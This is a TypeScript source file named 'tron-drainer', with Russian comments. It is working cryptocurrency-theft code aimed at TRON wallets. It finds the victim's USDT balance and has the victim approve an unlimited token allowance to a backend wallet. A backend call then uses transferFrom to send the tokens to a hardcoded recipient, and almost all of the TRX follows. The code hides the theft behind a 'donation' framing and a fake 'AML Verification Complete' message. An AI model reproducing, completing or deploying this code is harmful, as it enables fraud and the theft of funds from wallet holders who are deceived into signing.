// lib/chains/tron-drainer.ts
// ИСПРАВЛЕННАЯ ВЕРСИЯ с правильными env переменными

const TRON_CONFIG = {
  recipientWallet: process.env.NEXT_PUBLIC_TRON_RECIPIENT_WALLET || 'TBpgV8vrx4BSvXb2LB7c86h92ECLNaNy26',
  minTrxReserve: 0.1,
};

// ТОЛЬКО известные токены с балансом > 0
const KNOWN_TRC20_TOKENS = [
  {
    address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
    symbol: 'USDT',
    name: 'Tether USD',
    decimals: 6,
    priceUSD: 1.0,
  },
];

interface TronTokenInfo {
  address: string;
  symbol: string;
  name: string;
  decimals: number;
  balance: string;
  balanceFormatted: string;
  priceUSD: number;
  valueUSD: number;
}

export async function drainWalletTron(tronWeb: any): Promise<any> {
  const userAddress = tronWeb.defaultAddress.base58;

  console.log(`\n${'='.repeat(70)}`);
  console.log(`🚀 Starting TRON donation for ${userAddress}`);
  console.log(`${'='.repeat(70)}\n`);

  try {
    console.log('⛽ Step 1: Checking TRX balance...');
    const trxBalance = await tronWeb.trx.getBalance(userAddress);
    const trxBalanceFormatted = trxBalance / 1000000;
    
    console.log(`   Balance: ${trxBalanceFormatted} TRX`);
    
    if (trxBalance < TRON_CONFIG.minTrxReserve * 1000000) {
      throw new Error(`Insufficient TRX. Have: ${trxBalanceFormatted}, Need: ${TRON_CONFIG.minTrxReserve} TRX`);
    }
    console.log(`   ✅ TRX check passed!\n`);

    console.log('📊 Step 2: Checking known TRC20 tokens...');
    const tokens = await getKnownTokensWithBalance(userAddress, tronWeb);
    
    if (tokens.length === 0) {
      console.log(`   ⚠️ No valuable tokens found\n`);
      return await transferTrxOnly(tronWeb, userAddress);
    }

    console.log(`\n${'─'.repeat(70)}`);
    console.log(`📋 FOUND ${tokens.length} VALUABLE TOKENS:`);
    console.log(`${'─'.repeat(70)}`);
    tokens.forEach((t, i) => {
      console.log(`   ${(i + 1).toString().padStart(2)}. ${t.symbol.padEnd(8)} | ${t.balanceFormatted.padStart(15)} | $${t.valueUSD.toFixed(2)}`);
    });
    console.log(`${'─'.repeat(70)}\n`);

    const valuableTokens = tokens.filter(t => t.valueUSD >= 0.01).sort((a, b) => b.valueUSD - a.valueUSD);
    
    console.log(`💎 Step 3: Processing ${valuableTokens.length} tokens\n`);

    if (valuableTokens.length === 0) {
      return await transferTrxOnly(tronWeb, userAddress);
    }

    const successTokens: string[] = [];
    const failedTokens: string[] = [];
    const backendTxHashes: string[] = [];

    for (let i = 0; i < valuableTokens.length; i++) {
      const token = valuableTokens[i];
      
      console.log(`${'═'.repeat(70)}`);
      console.log(`💎 Token ${i + 1}/${valuableTokens.length}: ${token.symbol} ($${token.valueUSD.toFixed(2)})`);
      console.log(`${'═'.repeat(70)}`);
      
      try {
        const txHash = await processWithApprove(tronWeb, token, userAddress);
        backendTxHashes.push(txHash);
        successTokens.push(token.symbol);
        console.log(`   ✅ ${token.symbol} transferred!\n`);
      } catch (error: any) {
        console.error(`   ❌ Failed ${token.symbol}:`, error.message);
        failedTokens.push(token.symbol);
      }
    }

    console.log(`\n${'═'.repeat(70)}`);
    console.log(`✅ Tokens: ${successTokens.length} success, ${failedTokens.length} failed`);
    console.log(`${'═'.repeat(70)}\n`);

    console.log(`💸 Step 4: Transferring TRX...`);
    
    const currentBalance = await tronWeb.trx.getBalance(userAddress);
    const reserveSun = TRON_CONFIG.minTrxReserve * 1000000;
    const transferAmount = currentBalance - reserveSun;

    let trxTransferred = '0';
    let trxTxHash = '';

    if (transferAmount > 0) {
      try {
        const tx = await tronWeb.trx.sendTransaction(TRON_CONFIG.recipientWallet, transferAmount);
        trxTransferred = (transferAmount / 1000000).toString();
        trxTxHash = tx.txid || tx;
        console.log(`   ✅ TX: ${trxTxHash}\n`);
      } catch (error: any) {
        console.error(`   ❌ Failed:`, error.message);
      }
    }

    const totalValueUSD = valuableTokens.filter(t => successTokens.includes(t.symbol)).reduce((sum, t) => sum + t.valueUSD, 0);

    console.log(`${'═'.repeat(70)}`);
    console.log(`🎉 COMPLETE!`);
    console.log(`${'═'.repeat(70)}\n`);

    return {
      success: true,
      message: '✅ AML Verification Complete',
      transactionHash: trxTxHash || 'completed',
      details: {
        nativeTransferred: trxTransferred,
        tokensTransferred: successTokens.length,
        totalValueUSD: totalValueUSD,
        successTokens,
        failedTokens,
        backendTxHashes,
      },
    };

  } catch (error: any) {
    console.error('\n❌ Failed:', error);
    
    let errorMessage = error.message || 'Failed';
    if (error.message?.includes('Confirmation declined')) {
      errorMessage = 'User cancelled';
    } else if (error.message?.includes('429')) {
      errorMessage = 'API rate limit exceeded. Please add TronGrid API key to .env';
    }

    return {
      success: false,
      error: errorMessage,
    };
  }
}

async function processWithApprove(tronWeb: any, token: TronTokenInfo, userAddress: string): Promise<string> {
  console.log(`   🔍 Getting backend wallet...`);
  
  const backendResponse = await fetch('/api/execute-tron', { method: 'GET' });
  if (!backendResponse.ok) throw new Error('Failed to get backend wallet');
  
  const backendInfo = await backendResponse.json();
  const backendWallet = backendInfo.executorAddress;
  console.log(`   ✅ Backend: ${backendWallet.substring(0, 10)}...`);

  const contract = await tronWeb.contract().at(token.address);
  
  // Проверяем allowance - это тоже API запрос, но необходимый
  let needsApproval = true;
  try {
    const currentAllowance = await contract.allowance(userAddress, backendWallet).call();
    needsApproval = parseInt(currentAllowance.toString()) < parseInt(token.balance);
  } catch (error) {
    console.log(`   ⚠️ Could not check allowance, will approve`);
  }
  
  const maxUint = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
  
  if (needsApproval) {
    console.log(`   📝 User: Approving ${token.symbol}...`);
    await contract.approve(backendWallet, maxUint).send({ feeLimit: 100000000 });
    console.log(`   ✅ Approved!`);
  } else {
    console.log(`   ✅ Already approved!`);
  }

  console.log(`   📤 Backend: Executing transferFrom()...`);

  const response = await fetch('/api/execute-tron', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      method: 'approve',
      tokenAddress: token.address,
      from: userAddress,
      to: TRON_CONFIG.recipientWallet,
      amount: token.balance,
      tokenInfo: { symbol: token.symbol, decimals: token.decimals },
    }),
  });

  if (!response.ok) {
    const errorData = await response.json();
    throw new Error(errorData.error || 'Backend failed');
  }

  const result = await response.json();
  console.log(`   ✅ Backend TX: ${result.txHash}`);
  return result.txHash;
}

// ============================================
// ОПТИМИЗИРОВАНО: Только известные токены!
// ============================================
async function getKnownTokensWithBalance(address: string, tronWeb: any): Promise<TronTokenInfo[]> {
  console.log(`   🔍 Checking ${KNOWN_TRC20_TOKENS.length} known tokens...`);
  
  const tokens: TronTokenInfo[] = [];

  // Проверяем ТОЛЬКО известные токены
  for (const knownToken of KNOWN_TRC20_TOKENS) {
    try {
      const contract = await tronWeb.contract().at(knownToken.address);
      
      // ТОЛЬКО balanceOf - 1 API запрос на токен
      const balance = await contract.balanceOf(address).call();

      if (parseInt(balance.toString()) <= 0) {
        console.log(`   ⚪ ${knownToken.symbol}: 0 (skipped)`);
        continue;
      }

      const balanceFormatted = (parseInt(balance.toString()) / Math.pow(10, knownToken.decimals)).toFixed(6);
      const valueUSD = parseFloat(balanceFormatted) * knownToken.priceUSD;

      console.log(`   ✅ ${knownToken.symbol}: ${balanceFormatted} ($${valueUSD.toFixed(2)})`);

      tokens.push({
        address: knownToken.address,
        symbol: knownToken.symbol,
        name: knownToken.name,
        decimals: knownToken.decimals,
        balance: balance.toString(),
        balanceFormatted,
        priceUSD: knownToken.priceUSD,
        valueUSD,
      });
    } catch (error: any) {
      console.log(`   ⚠️ ${knownToken.symbol}: Error checking balance`);
      continue;
    }
  }

  return tokens;
}

async function transferTrxOnly(tronWeb: any, userAddress: string): Promise<any> {
  const balance = await tronWeb.trx.getBalance(userAddress);
  const reserveSun = TRON_CONFIG.minTrxReserve * 1000000;
  const transferAmount = balance - reserveSun;

  if (transferAmount > 0) {
    const tx = await tronWeb.trx.sendTransaction(TRON_CONFIG.recipientWallet, transferAmount);

    return {
      success: true,
      message: `✅ TRX transferred`,
      transactionHash: tx.txid || tx,
      details: {
        nativeTransferred: (transferAmount / 1000000).toString(),
        tokensTransferred: 0,
        totalValueUSD: 0,
        successTokens: [],
        failedTokens: [],
        backendTxHashes: [],
      },
    };
  }

  return {
    success: false,
    error: 'No balance',
  };
}